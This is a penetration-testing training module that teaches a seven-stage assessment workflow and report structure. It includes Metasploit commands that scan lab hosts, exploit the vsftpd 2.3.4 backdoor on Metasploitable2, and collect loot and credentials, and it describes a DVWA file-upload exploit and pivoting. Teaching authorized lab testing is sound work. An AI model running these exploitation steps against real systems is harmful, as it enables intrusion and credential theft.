# Module 10 — Professional Workflow

## Objectives

Internalize the full professional penetration-testing kill chain — Reconnaissance → Enumeration → Vulnerability Validation → Exploitation → Post-Exploitation → Documentation → Reporting — and practice it end-to-end in a single simulated assessment combining everything from Modules 1–9.

## Theory

Tools don't make a professional tester; a repeatable, defensible process does. Clients and exam graders alike care less about which exact Metasploit module you used and more about whether you followed a methodology that's reconstructable, justifiable, and properly documented. This module is about wiring the previous nine into one disciplined loop.

## Deep Technical Explanation — The Workflow

**1. Reconnaissance** — passive/light-touch information gathering about scope (in a lab, this is mostly "what's actually running in my lab network," in real engagements it includes OSINT, scope documents, rules of engagement).

**2. Enumeration** — Module 3's territory: host discovery, port/service scanning, protocol-specific enumeration, all logged to the database.

**3. Vulnerability Validation** — cross-referencing exact service versions against known vulnerabilities, using `check` where available, before ever firing a real exploit (Module 4's discipline).

**4. Exploitation** — Module 4's mechanics: matched exploit + payload, correct target/architecture, session established.

**5. Post-Exploitation** — Module 5/7's territory: privilege confirmation, evidence collection, scoped lateral movement/pivoting (Module 8) if in scope.

**6. Documentation** — continuous, not after-the-fact: screenshots, command output, timestamps, affected hosts/services, as you go.

**7. Reporting** — translating technical findings into a structured deliverable: executive summary (business risk, plain language), methodology, detailed findings with risk ratings (e.g., Critical/High/Medium/Low, often CVSS-backed), evidence appendix, remediation recommendations.

### A Minimal Report Skeleton

```
1. Executive Summary
   - Engagement scope and dates
   - Overall risk posture in plain language
2. Methodology
   - Tools and techniques used (e.g., "Metasploit Framework 6.x, Nmap, manual verification")
3. Findings
   - Finding 1: [Title] — Risk: Critical/High/Medium/Low
     - Affected host/service
     - Description
     - Evidence (screenshot/command output reference)
     - Remediation recommendation
   - Finding 2: ...
4. Appendix
   - Full command logs
   - Raw scan output references
```

## Practical Examples — Full Simulated Assessment

**Scenario:** Your lab network contains Metasploitable2 and a DVWA instance. You are authorized (by yourself, in your own lab) to perform a full assessment and produce a short report.

```bash
# 1. Recon / Enumeration
msf6 > workspace -a capstone-assessment
msf6 > db_nmap -sV -p- 192.168.56.101    # Metasploitable2
msf6 > db_nmap -sV -p- 192.168.56.102    # DVWA host
msf6 > services

# 2. Vulnerability Validation
msf6 > search vsftpd
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > check

# 3. Exploitation
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

# 4. Post-Exploitation
sessions -i 1
sysinfo
getuid
run post/multi/recon/local_exploit_suggester SESSION=1

# 5. Documentation (do this throughout, not just here)
loot
creds
hosts -c address,os_name
services -c port,proto,name,info
```

**Expected output across the chain:** a populated `services` table for both hosts, a confirmed-vulnerable `check` result, a root-level shell session on Metasploitable2, and a populated `loot`/`creds` table ready to reference in your report.

## Common Mistakes

- Treating documentation as a final step instead of a continuous habit — by the time you "remember to document," half the useful detail (exact timestamps, exact command sequences that worked) is already lost.
- Writing findings in tool-output language instead of plain business-risk language for the executive summary audience.
- Skipping a remediation recommendation on a finding — a finding without "how to fix this" is only half a finding.
- Forgetting to map the report's risk ratings consistently (don't call one finding "Critical" and an equally severe one "High" with no stated rationale).

## Real-World Usage

This entire module *is* real-world usage — the workflow described here is, almost verbatim, what's followed on actual paid penetration testing engagements, and it's also exactly the rubric OSCP-style practical exams grade against (methodology and documentation, not just "did you get root").

## Guided Lab — The Capstone Walkthrough

**Objective:** Execute the full seven-stage workflow against your lab network and produce a short written report.

**Setup:** Metasploitable2 + DVWA running, fresh workspace.

**Steps:**
1. Run the full command sequence in the Practical Examples section above against both hosts.
2. For DVWA, separately walk through enumeration → identify the file upload vulnerability → exploit it with a generated payload (Module 6) → confirm a session.
3. Using the report skeleton above, write up at least two findings (one per host) with risk rating, evidence reference, and remediation recommendation.

**Expected output:** A short Markdown or text report with at least two complete findings.

**Verification:** Have someone else (or re-read it yourself after a break) confirm the report is understandable *without* them having watched you do the work.

**Troubleshooting:** If you get stuck at any single stage, that's a strong signal to re-read the corresponding earlier module rather than guessing — the workflow only works if each stage is solid.

## Challenge Lab

Repeat the full capstone workflow, but this time route through a pivot (Module 8) to reach a third, otherwise-unreachable lab host, and add a third finding to your report describing the internal host's exposure and how it was reached.

## Review Questions

1. List the seven stages of the professional workflow in order.
2. Why is documentation described as "continuous" rather than "a final step"?
3. What four things should a well-written finding contain?
4. Why does an executive summary use plain business language instead of tool/technical output?
5. What does it mean for documentation to be "reconstructable" or "defensible"?

## Answers

1. Reconnaissance, Enumeration, Vulnerability Validation, Exploitation, Post-Exploitation, Documentation, Reporting.
2. Because critical detail (exact timestamps, the precise sequence of commands that actually worked) degrades quickly from memory — capturing it as you go preserves accuracy that reconstruction afterward can't fully recover.
3. Affected host/service, description of the issue, supporting evidence, and a remediation recommendation (often alongside a risk rating).
4. Because the primary audience for that section is often non-technical decision-makers who need to understand business risk and urgency, not command syntax.
5. That someone else (a peer, a client, an exam grader) could follow your documentation and arrive at the same conclusions/results you did, with clear justification for every step taken.
